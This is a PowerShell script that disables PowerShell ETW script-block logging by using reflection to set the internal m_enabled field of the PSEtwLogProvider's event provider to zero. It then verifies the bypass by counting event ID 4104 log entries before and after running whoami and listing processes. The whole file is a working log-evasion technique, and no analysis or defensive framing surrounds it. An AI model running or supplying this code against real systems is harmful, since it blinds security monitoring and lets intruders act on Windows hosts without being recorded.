function Disable-PSLogging {
    try {
        Write-Host "Applying PowerShell ETW Reflection Bypass..."

        # Get the PSEtwLogProvider type
        $logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')

        if ($logProvider -ne $null) {
            # Get the etwProvider field
            $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)

            if ($etwProvider -ne $null) {
                # Disable the ETW provider by setting m_enabled to 0
                [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0)
                Write-Host "SUCCESS: PowerShell ETW logging disabled!"
                return $true
            }
        }

        Write-Host "FAILED: Could not disable PowerShell ETW logging"
        return $false

    } catch {
        Write-Host "ERROR: $($_.Exception.Message)"
        return $false
    }
}

# Test the bypass
Write-Host "Testing PowerShell Reflection Bypass..."

# Count events before bypass
$before = (Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} -ErrorAction SilentlyContinue | Measure-Object).Count
Write-Host "Events before bypass: $before"

# Apply bypass
$success = Disable-PSLogging

if ($success) {
    # Test commands that should NOT be logged now
    Write-Host "Executing test commands (should not be logged)..."
    whoami
    Get-Process | Select-Object -First 3
    Write-Host "This message should not appear in PowerShell logs"

    # Wait and check
    Start-Sleep 3
    $after = (Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} -ErrorAction SilentlyContinue | Measure-Object).Count
    Write-Host "Events after bypass: $after"

    $diff = $after - $before
    if ($diff -eq 0) {
        Write-Host "SUCCESS: No new PowerShell events logged!"
    } else {
        Write-Host "PARTIAL: $diff new events logged (some evasion occurred)"
    }
}